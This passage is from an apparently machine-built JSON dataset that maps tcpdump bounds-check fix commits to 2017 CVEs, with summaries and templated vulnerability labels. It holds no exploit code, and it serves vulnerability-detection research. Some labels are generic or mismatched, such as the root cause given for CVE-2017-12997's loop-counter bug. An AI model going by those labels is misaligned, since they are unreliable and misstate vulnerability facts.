modified\nso the capture file won't be rejected as an invalid capture.\n\nMove a return to make the code a bit cleaner (i.e., make it more obvious\nthat if we don't have enough of the PGM header, we just print the source\nand destination IP addresses, mark it as incomplete PGM, and don't try\nto look at the PGM header).","summary":"The PGM parser in tcpdump before 4.9.2 has a buffer over-read in print-pgm.c:pgm_print().","commit_message_1":"add a bound check","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"ae83295915d08a854de27a88efac5dd7353e6d3f","cve_id":"CVE-2017-13033","cwe_id":"CWE-125","commit_message":"CVE-2017-13033\/VTP: Add more bound and length checks.\n\nThis fixes a buffer over-read discovered by Bhargava Shastry.\n\nAdd a test using the capture file supplied by the reporter(s), modified\nso the capture file won't be rejected as an invalid capture.\n\nUpdate another VTP test's .out file for this change.\n\nDon't treate a TLV type or length of 0 as invalid; a type of 0 should\njust be reported as illegal if that type isn't used, and the length is\nthe length of the *value*, not the length of the entire TLV, so if it's\nzero there won't be an infinite loop.  (It's still not *legal*, as the\nvalues of all the TLVs we handle are 1 16-bit word long; we added a\ncheck for that.)\n\nUpdate some comments while we're at it, to give a new URL for one Cisco\npage and a non-Cisco URL for another former Cisco page (Cisco's UniverCD\npages don't seem to be available any more, and Cisco's robots.txt file\ndidn't allow the Wayback Machine to archive it).","summary":"The VTP parser in tcpdump before 4.9.2 has a buffer over-read in print-vtp.c:vtp_print().","commit_message_1":"add more bound and length check","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"1bc78d795cd5cad5525498658f414a11ea0a7e9c","cve_id":"CVE-2017-13032","cwe_id":"CWE-125","commit_message":"CVE-2017-13032\/RADIUS: Check whether a byte exists before testing its value.\n\nReverse the test in a for loop to test the length before testing whether\nwe have a null byte.\n\nThis fixes a buffer over-read discovered by Bhargava Shastry.\n\nAdd a test using the capture file supplied by the reporter(s), modified\nso the capture file won't be rejected as an invalid capture.\n\nClean up other length tests while we're at it.","summary":"The RADIUS parser in tcpdump before 4.9.2 has a buffer over-read in print-radius.c:print_attr_string().","commit_message_1":"check whether a byte exists before testing it value","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"2d669862df7cd17f539129049f6fb70d17174125","cve_id":"CVE-2017-13031","cwe_id":"CWE-125","commit_message":"CVE-2017-13031\/Check for the presence of the entire IPv6 fragment header.\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT\/TU Berlin.\n\nAdd a test using the capture file supplied by the reporter(s), modified\nso the capture file won't be rejected as an invalid capture.\n\nClean up some whitespace in tests\/TESTLIST while we're at it.","summary":"The IPv6 fragmentation header parser in tcpdump before 4.9.2 has a buffer over-read in print-frag6.c:frag6_print().","commit_message_1":"<cve_id>\/check for the presence of the entire ipv6 fragment header","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"5dc1860d8267b1e0cb78c9ffa2a40bea2fdb3ddc","cve_id":"CVE-2017-13030","cwe_id":"CWE-125","commit_message":"CVE-2017-13030\/PIM: Redo bounds checks and add length checks.\n\nUse ND_TCHECK macros to do bounds checking, and add length checks before\nthe bounds checks.\n\nAdd a bounds check that the review process found was missing.\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT\/TU Berlin.\n\nAdd a test using the capture file supplied by the reporter(s), modified\nso the capture file won't be rejected as an invalid capture.\n\nUpdate one test output file to reflect the changes.","summary":"The PIM parser in tcpdump before 4.9.2 has a buffer over-read in print-pim.c, several functions.","commit_message_1":"redo bound check and add length check","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"7029d15f148ef24bb7c6668bc640f5470d085e5a","cve_id":"CVE-2017-13029","cwe_id":"CWE-125","commit_message":"CVE-2017-13029\/PPP: Fix a bounds check, and clean up other bounds checks.\n\nFor configuration protocol options, use ND_TCHECK() and\nND_TCHECK_nBITS() macros, passing them the appropriate pointer argument.\nThis fixes one case where the ND_TCHECK2() call they replace was not\nchecking enough bytes.\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT\/TU Berlin.\n\nAdd a test using the capture file supplied by the reporter(s), modified\nso the capture file won't be rejected as an invalid capture.","summary":"The PPP parser in tcpdump before 4.9.2 has a buffer over-read in print-ppp.c:print_ccp_config_options().","commit_message_1":"fix a bound check , and clean up other bound check","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"a77ff09c46560bc895dea11dc9fe643486b056ac","cve_id":"CVE-2017-13027","cwe_id":"CWE-125","commit_message":"CVE-2017-13027\/LLDP: Fix a bounds check.\n\nThe total length of the OID is the OID length plus the length of the OID\nlength itself.\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT\/TU Berlin.\n\nAdd a test using the capture file supplied by the reporter(s), modified\nso the capture file won't be rejected as an invalid capture.","summary":"The LLDP parser in tcpdump before 4.9.2 has a buffer over-read in print-lldp.c:lldp_mgmt_addr_tlv_print().","commit_message_1":"fix a bound check","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"b20e1639dbac84b3fcb393858521c13ad47a9d70","cve_id":"CVE-2017-13026","cwe_id":"CWE-125","commit_message":"CVE-2017-13026\/IS-IS: Clean up processing of subTLVs.\n\nAdd bounds checks, do a common check to make sure we captured the entire\nsubTLV, add checks to make sure the subTLV fits within the TLV.\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT\/TU Berlin.\n\nAdd tests using the capture files supplied by the reporter(s), modified\nso the capture files won't be rejected as an invalid capture.\n\nUpdate existing tests for changes to IS-IS dissector.","summary":"The ISO IS-IS parser in tcpdump before 4.9.2 has a buffer over-read in print-isoclns.c, several functions.","commit_message_1":"clean up processing of subtlvs","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over-read","Attack Type":"remote attacker"},{"commit_id":"5338aac7b8b880b0c5e0c15e27dadc44c5559284","cve_id":"CVE-2017-13025","cwe_id":"CWE-125","commit_message":"CVE-2017-13025\/IPv6 mobility: Add a bounds check before fetching data\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT\/TU Berlin.\n\nAdd a test using the capture file supplied by the reporter(s), modified\nso the capture file won't cause 'tcpdump: pcap_loop: truncated dump file'","summary":"The IPv6 mobility parser in tcpdump before 4.9.2 has a buffer over-read in print-mobility.c:mobility_opt_print().","commit_message_1":"add a bound check before fetching data this fix a buffer over-read discovered by bhargava shastry , sect\/tu berlin","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"7d3aba9f06899d0128ef46e8a2fa143c6fad8f62","cve_id":"CVE-2017-13024","cwe_id":"CWE-125","commit_message":"CVE-2017-13024\/IPv6 mobility: Add a bounds check before fetching data\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT\/TU Berlin.\n\nAdd a test using the capture file supplied by the reporter(s), modified\nso the capture file won't cause 'tcpdump: pcap_loop: truncated dump file'","summary":"The IPv6 mobility parser in tcpdump before 4.9.2 has a buffer over-read in print-mobility.c:mobility_opt_print().","commit_message_1":"add a bound check before fetching data this fix a buffer over-read discovered by bhargava shastry , sect\/tu berlin","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"b8e559afaeb8fe0604a1f8e3ad4dc1445de07a00","cve_id":"CVE-2017-13023","cwe_id":"CWE-125","commit_message":"CVE-2017-13023\/IPv6 mobility: Add a bounds check before fetching data\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT\/TU Berlin.\n\nAdd a test using the capture file supplied by the reporter(s), modified\nso the capture file won't cause 'tcpdump: pcap_loop: truncated dump file'","summary":"The IPv6 mobility parser in tcpdump before 4.9.2 has a buffer over-read in print-mobility.c:mobility_opt_print().","commit_message_1":"add a bound check before fetching data this fix a buffer over-read discovered by bhargava shastry , sect\/tu berlin","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"eee0b04bcfdae319c242b0b8fc3d07029ee65b8c","cve_id":"CVE-2017-13022","cwe_id":"CWE-125","commit_message":"CVE-2017-13022\/IP: Add bounds checks to ip_printroute().\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT\/TU Berlin.\n\nAdd a test using the capture file supplied by the reporter(s), modified\nso the capture file won't be rejected as an invalid capture.","summary":"The IP parser in tcpdump before 4.9.2 has a buffer over-read in print-ip.c:ip_printroute().","commit_message_1":"add bound check to ip_printroute ( )","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"67c7126062d59729cd421bb38f9594015c9907ba","cve_id":"CVE-2017-13021","cwe_id":"CWE-125","commit_message":"CVE-2017-13021\/ICMP6: Add a missing bounds check.\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT\/TU Berlin.\n\nAdd a test using the capture file supplied by the reporter(s), modified\nso the capture file won't be rejected as an invalid capture.","summary":"The ICMPv6 parser in tcpdump before 4.9.2 has a buffer over-read in print-icmp6.c:icmp6_print().","commit_message_1":"add a missing bound check","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"c5dd7bef5e54da5996dc4713284aa6266ae75b75","cve_id":"CVE-2017-13020","cwe_id":"CWE-125","commit_message":"CVE-2017-13020\/VTP: Add some missing bounds checks.\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT\/TU Berlin.\n\nAdd a test using the capture file supplied by the reporter(s), modified\nso the capture file won't be rejected as an invalid capture.","summary":"The VTP parser in tcpdump before 4.9.2 has a buffer over-read in print-vtp.c:vtp_print().","commit_message_1":"add some missing bound check","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"4601c685e7fd19c3724d5e499c69b8d3ec49933e","cve_id":"CVE-2017-13019","cwe_id":"CWE-125","commit_message":"CVE-2017-13019: Clean up PGM option processing.\n\nAdd #defines for option lengths or the lengths of the fixed-length part\nof the option.  Sometimes those #defines differ from what was there\nbefore; what was there before was wrong, probably because the option\nlengths given in RFC 3208 were sometimes wrong - some lengths included\nthe length of the option header, some lengths didn't.\n\nDon't use \"sizeof(uintXX_t)\" for sizes in the packet, just use the\nnumber of bytes directly.\n\nFor the options that include an IPv4 or IPv6 address, check the option\nlength against the length of what precedes the address before fetching\nany of that data.\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT\/TU Berlin.\n\nAdd a test using the capture file supplied by the reporter(s), modified\nso the capture file won't be rejected as an invalid capture.","summary":"The PGM parser in tcpdump before 4.9.2 has a buffer over-read in print-pgm.c:pgm_print().","commit_message_1":"clean up pgm option processing","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"26a6799b9ca80508c05cac7a9a3bef922991520b","cve_id":"CVE-2017-13018","cwe_id":"CWE-125","commit_message":"CVE-2017-13018\/PGM: Add a missing bounds check.\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT\/TU Berlin.\n\nAdd a test using the capture file supplied by the reporter(s), modified\nso the capture file won't be rejected as an invalid capture.","summary":"The PGM parser in tcpdump before 4.9.2 has a buffer over-read in print-pgm.c:pgm_print().","commit_message_1":"add a missing bound check","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"11b426ee05eb62ed103218526f1fa616851c43ce","cve_id":"CVE-2017-13017","cwe_id":"CWE-125","commit_message":"CVE-2017-13017\/DHCPv6: Add a missing option length check.\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT\/TU Berlin.\n\nAdd a test using the capture file supplied by the reporter(s), modified\nso the capture file won't be rejected as an invalid capture.","summary":"The DHCPv6 parser in tcpdump before 4.9.2 has a buffer over-read in print-dhcp6.c:dhcp6opt_print().","commit_message_1":"add a missing option length check","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"c177cb3800a9a68d79b2812f0ffcb9479abd6eb8","cve_id":"CVE-2017-13016","cwe_id":"CWE-125","commit_message":"CVE-2017-13016\/ES-IS: Fix printing of addresses in RD PDUs.\n\nAlways print the SNPA, and flag it as such; only print it as a MAC\naddress if it's 6 bytes long.\n\nIdentify the NET as such.\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT\/TU Berlin.\n\nAdd tests using the capture files supplied by the reporter(s), modified\nso the capture files won't be rejected as an invalid capture.","summary":"The ISO ES-IS parser in tcpdump before 4.9.2 has a buffer over-read in print-isoclns.c:esis_print().","commit_message_1":"fix printing of address in rd pdus","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over-read","Attack Type":"remote attacker"},{"commit_id":"985122081165753c7442bd7824c473eb9ff56308","cve_id":"CVE-2017-13015","cwe_id":"CWE-125","commit_message":"CVE-2017-13015\/EAP: Add more bounds checks.\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT\/TU Berlin.\n\nAdd a test using the capture file supplied by the reporter(s), modified\nso the capture file won't be rejected as an invalid capture.","summary":"The EAP parser in tcpdump before 4.9.2 has a buffer over-read in print-eap.c:eap_print().","commit_message_1":"add more bound check","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over-read","Attack Type":"remote attacker"},{"commit_id":"cc356512f512e7fa423b3674db4bb31dbe40ffec","cve_id":"CVE-2017-13014","cwe_id":"CWE-125","commit_message":"CVE-2017-13014\/White Board: Do more bounds checks.\n\nThis fixes a buffer over-read discovered by Yannick Formaggio.\n\nAdd a test using the capture file supplied by the reporter(s).\n\nWhile we're at it, print a truncation error if the packets are\ntruncated, rather than just, in effect, ignoring the result of the\nroutines that print particular packet types.","summary":"The White Board protocol parser in tcpdump before 4.9.2 has a buffer over-read in print-wb.c:wb_prep(), several functions.","commit_message_1":"do more bound check","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over-read","Attack Type":"remote attacker"},{"commit_id":"13ab8d18617d616c7d343530f8a842e7143fb5cc","cve_id":"CVE-2017-13013","cwe_id":"CWE-125","commit_message":"CVE-2017-13013\/ARP: Fix printing of ARP protocol addresses.\n\nIf the protocol type isn't ETHERTYPE_IP or ETHERTYPE_TRAIL, or if the\nprotocol address length isn't 4, don't print the address as an IPv4 address.\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT\/TU Berlin.\n\nAdd a test using the capture file supplied by the reporter(s), modified\nso the capture file won't be rejected as an invalid capture.\n\nUpdate another test file's tcpdump output to reflect this change.","summary":"The ARP parser in tcpdump before 4.9.2 has a buffer over-read in print-arp.c, several functions.","commit_message_1":"fix printing of arp protocol address","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"8509ef02eceb2bbb479cea10fe4a7ec6395f1a8b","cve_id":"CVE-2017-13012","cwe_id":"CWE-125","commit_message":"CVE-2017-13012\/ICMP: Add a missing bounds check.\n\nCheck before fetching the length from the included packet's IPv4 header.\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT\/TU Berlin.\n\nAdd a test using the capture file supplied by the reporter(s), modified\nso the capture file won't be rejected as an invalid capture.","summary":"The ICMP parser in tcpdump before 4.9.2 has a buffer over-read in print-icmp.c:icmp_print().","commit_message_1":"add a missing bound check","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"9f0730bee3eb65d07b49fd468bc2f269173352fe","cve_id":"CVE-2017-13011","cwe_id":"CWE-119","commit_message":"CVE-2017-13011\/Properly check for buffer overflow in bittok2str_internal().\n\nAlso, make the buffer bigger.\n\nThis fixes a buffer overflow discovered by Bhargava Shastry,\nSecT\/TU Berlin.\n\nAdd a test using the capture file supplied by the reporter(s), modified\nso the capture file won't be rejected as an invalid capture.","summary":"Several protocol parsers in tcpdump before 4.9.2 could cause a buffer overflow in util-print.c:bittok2str_internal().","commit_message_1":"<cve_id>\/properly check for buffer overflow in bittok2str_internal ( )","Vulnerability Type":"buffer overflow","Attack Vector":"By sending an overly long string argument","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"caused by improper bounds checking by the bittok2str_internal component","Attack Type":"remote attacker"},{"commit_id":"877b66b398518d9501513e0860c9f3a8acc70892","cve_id":"CVE-2017-13010","cwe_id":"CWE-125","commit_message":"CVE-2017-13010\/BEEP: Do bounds checking when comparing strings.\n\nThis fixes a buffer over-read discovered by Brian 'geeknik' Carpenter.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The BEEP parser in tcpdump before 4.9.2 has a buffer over-read in print-beep.c:l_strnstart().","commit_message_1":"do bound checking when comparing string","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"db8c799f6dfc68765c9451fcbfca06e662f5bd5f","cve_id":"CVE-2017-13009","cwe_id":"CWE-125","commit_message":"CVE-2017-13009\/IPv6 mobility: Add a bounds check.\n\nThis fixes a buffer over-read discovered by Brian 'geeknik' Carpenter.\n\nAdd a test using the capture file supplied by the reporter(s).\n\nWhile we're at it:\n\nAdd a comment giving the RFC for IPv6 mobility headers.\n\nClean up some bounds checks to make it clearer what they're checking, by\nmatching the subsequent EXTRACT_ calls or memcpy.\n\nFor the binding update, if none of the flag bits are set, don't check\nthe individual flag bits.","summary":"The IPv6 mobility parser in tcpdump before 4.9.2 has a buffer over-read in print-mobility.c:mobility_print().","commit_message_1":"add a bound check","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over-read","Attack Type":"remote attacker"},{"commit_id":"5edf405d7ed9fc92f4f43e8a3d44baa4c6387562","cve_id":"CVE-2017-13008","cwe_id":"CWE-125","commit_message":"CVE-2017-13008\/IEEE 802.11: Fix TIM bitmap copy to copy from p + offset.\n\noffset has already been advanced to point to the bitmap; we shouldn't\nadd the amount to advance again.\n\nThis fixes a buffer over-read discovered by Brian 'geeknik' Carpenter.\n\nAdd a test using the capture file supplied by the reporter(s).\n\nWhile we're at it, remove some redundant tests - we've already checked,\nbefore the case statement, whether we have captured the entire\ninformation element and whether the entire information element is\npresent in the on-the-wire packet; in the cases for particular IEs, we\nonly need to make sure we don't go past the end of the IE.","summary":"The IEEE 802.11 parser in tcpdump before 4.9.2 has a buffer over-read in print-802_11.c:parse_elements().","commit_message_1":"fix tim bitmap copy to copy from p + offset","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over-read","Attack Type":"remote attacker"},{"commit_id":"ca336198e8bebccc18502de27672fdbd6eb34856","cve_id":"CVE-2017-13007","cwe_id":"CWE-125","commit_message":"CVE-2017-13007\/PKTAP: Pass a properly updated struct pcap_pkthdr to the sub-dissector.\n\nThe sub-dissector expects that the length and captured length will\nreflect the actual remaining data in the packet, not the raw amount\nincluding the PKTAP header; pass an updated header, just as we do for\nPPI.\n\nThis fixes a buffer over-read discovered by Yannick Formaggio.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The Apple PKTAP parser in tcpdump before 4.9.2 has a buffer over-read in print-pktap.c:pktap_if_print().","commit_message_1":"pas a properly updated struct pcap_pkthdr to the sub-dissector","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"cc4a7391c616be7a64ed65742ef9ed3f106eb165","cve_id":"CVE-2017-13006","cwe_id":"CWE-125","commit_message":"CVE-2017-13006\/L2TP: Check whether an AVP's content exceeds the AVP length.\n\nIt's not good enough to check whether all the data specified by the AVP\nlength was captured - you also have to check whether that length is\nlarge enough for all the required data in the AVP.\n\nThis fixes a buffer over-read discovered by Yannick Formaggio.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The L2TP parser in tcpdump before 4.9.2 has a buffer over-read in print-l2tp.c, several functions.","commit_message_1":"check whether an avp 's content exceeds the avp length","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"b45a9a167ca6a3ef2752ae9d48d56ac14b001bfd","cve_id":"CVE-2017-13005","cwe_id":"CWE-125","commit_message":"CVE-2017-13005\/NFS: Add two bounds checks before fetching data\n\nThis fixes a buffer over-read discovered by Kamil Frankowicz.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The NFS parser in tcpdump before 4.9.2 has a buffer over-read in print-nfs.c:xid_map_enter().","commit_message_1":"add two bound check before fetching data this fix a buffer over-read discovered by kamil frankowicz","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"a25211918f2e790c67d859d20ccf8dbb81da1598","cve_id":"CVE-2017-13003","cwe_id":"CWE-125","commit_message":"CVE-2017-13003\/Clean up the LMP dissector.\n\nDo a lot more bounds and length checks.\n\nAdd a EXTRACT_8BITS() macro, for completeness, and so as not to confuse\npeople into thinking that, to fetch a 1-byte value from a packet, they\nneed to use EXTRACT_16BITS() to fetch a 2-byte value and then use\nshifting and masking to extract the desired byte.  Use that rather than\nusing EXTRACT_16BITS() to fetch a 2-byte value and then shifting and\nmasking to extract the desired byte.\n\nDon't treat IPv4 addresses and unnumbered interface IDs the same; the\nfirst should be printed as an IPv4 address but the latter should just be\nprinted as numbers.  Handle IPv6 addresses in more object types while\nwe're at it.\n\nThis fixes a buffer over-read discovered by Forcepoint's security\nresearchers Otto Airamo & Antti Levom\u00e4ki.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The LMP parser in tcpdump before 4.9.2 has a buffer over-read in print-lmp.c:lmp_print().","commit_message_1":"<cve_id>\/clean up the lmp dissector","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"cbddb98484ea8ec1deece351abd56e063d775b38","cve_id":"CVE-2017-13002","cwe_id":"CWE-125","commit_message":"CVE-2017-13002\/AODV: Add some missing bounds checks.\n\nIn aodv_extension() do a bounds check on the extension header before we\nlook at it.\n\nThis fixes a buffer over-read discovered by Kamil Frankowicz.\n\nAdd a test using the capture file supplied by the reporter(s).\n\nWhile we're at it, add the RFC number, and check the validity of the\nlength for the Hello extension.","summary":"The AODV parser in tcpdump before 4.9.2 has a buffer over-read in print-aodv.c:aodv_extension().","commit_message_1":"add some missing bound check","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"7a923447fd49a069a0fd3b6c3547438ab5ee2123","cve_id":"CVE-2017-13001","cwe_id":"CWE-125","commit_message":"CVE-2017-13001\/NFS: Don't copy more data than is in the file handle.\n\nAlso, put the buffer on the stack; no reason to make it static.  (65\nbytes isn't a lot.)\n\nThis fixes a buffer over-read discovered by Kamil Frankowicz.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The NFS parser in tcpdump before 4.9.2 has a buffer over-read in print-nfs.c:nfs_printfh().","commit_message_1":"do n't copy more data than is in the file handle","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"8512734883227c11568bb35da1d48b9f8466f43f","cve_id":"CVE-2017-13000","cwe_id":"CWE-125","commit_message":"CVE-2017-13000\/IEEE 802.15.4: Fix bug introduced two fixes prior.\n\nWe've already advanced the pointer past the PAN ID, if present; it now\npoints to the address, so don't add 2 to it.\n\nThis fixes a buffer over-read discovered by Forcepoint's security\nresearchers Otto Airamo & Antti Levom\u00e4ki.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The IEEE 802.15.4 parser in tcpdump before 4.9.2 has a buffer over-read in print-802_15_4.c:ieee802_15_4_if_print().","commit_message_1":"fix bug introduced two fix prior","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over-read","Attack Type":"remote attacker"},{"commit_id":"3b32029db354cbc875127869d9b12a9addc75b50","cve_id":"CVE-2017-12999","cwe_id":"CWE-125","commit_message":"CVE-2017-12999\/IS-IS: Add a missing length check.\n\nThis fixes a buffer over-read discovered by Forcepoint's security\nresearchers Otto Airamo & Antti Levom\u00e4ki.\n\nAdd tests using the capture files supplied by the reporter(s).","summary":"The IS-IS parser in tcpdump before 4.9.2 has a buffer over-read in print-isoclns.c:isis_print().","commit_message_1":"add a missing length check","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over-read","Attack Type":"remote attacker"},{"commit_id":"979dcefd7b259e9e233f77fe1c5312793bfd948f","cve_id":"CVE-2017-12998","cwe_id":"CWE-125","commit_message":"CVE-2017-12998\/IS-IS: Check for 2 bytes if we're going to fetch 2 bytes.\n\nProbably a copy-and-pasteo.\n\nThis fixes a buffer over-read discovered by Forcepoint's security\nresearchers Otto Airamo & Antti Levom\u00e4ki.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The IS-IS parser in tcpdump before 4.9.2 has a buffer over-read in print-isoclns.c:isis_print_extd_ip_reach().","commit_message_1":"check for <number> byte if we 're going to fetch <number> byte","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over-read","Attack Type":"remote attacker"},{"commit_id":"34cec721d39c76be1e0a600829a7b17bdfb832b6","cve_id":"CVE-2017-12997","cwe_id":"CWE-835","commit_message":"CVE-2017-12997\/LLDP: Don't use an 8-bit loop counter.\n\nIf you have a\n\n\tfor (i = 0; i < N; i++)\n\nloop, you'd better make sure that i is big enough to hold N - not N-1,\nN.\n\nThe TLV length here is 9 bits long, not 8 bits long, so an 8-bit loop\ncounter will overflow and you can loop infinitely.\n\nThis fixes an infinite loop discovered by Forcepoint's security\nresearchers Otto Airamo & Antti Levom\u00e4ki.\n\nAdd tests using the capture files supplied by the reporter(s).\n\nClean up the output a bit while we're at it.","summary":"The LLDP parser in tcpdump before 4.9.2 could enter an infinite loop due to a bug in print-lldp.c:lldp_private_8021_print().","commit_message_1":"do n't use an <number>-bit loop counter","Vulnerability Type":"Infinite Loop","Attack Vector":"By sending a specially crafted request","Impact":"cause a denial of service","Root Cause":"caused by the failure to restrict reload attempts for an insufficient list","Attack Type":"remote attacker"},{"commit_id":"6fca58f5f9c96749a575f52e20598ad43f5bdf30","cve_id":"CVE-2017-12996","cwe_id":"CWE-125","commit_message":"CVE-2017-12996\/PIMv2: Make sure PIM TLVs have the right length.\n\nWe do bounds checks based on the TLV length, so if the TLV's length is\ntoo short, and we don't check for that, we could end up fetching data\npast the end of the TLV - including past the length of the captured data\nin the packet.\n\nThis fixes a buffer over-read discovered by Forcepoint's security\nresearchers Otto Airamo & Antti Levom\u00e4ki.\n\nAdd tests using the capture files supplied by the reporter(s).","summary":"The PIMv2 parser in tcpdump before 4.9.2 has a buffer over-read in print-pim.c:pimv2_print().","commit_message_1":"make sure pim tlvs have the right length","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"3a76fd7c95fced2c2f8c8148a9055c3a542eff29","cve_id":"CVE-2017-12995","cwe_id":"CWE-835","commit_message":"CVE-2017-12995\/Check for DNS compression pointers that don't point backwards.\n\nThis is what BIND 9.11.0-P2 does; it not only detects pointers that\nloop, as \"point backwards\" means \"point before anything 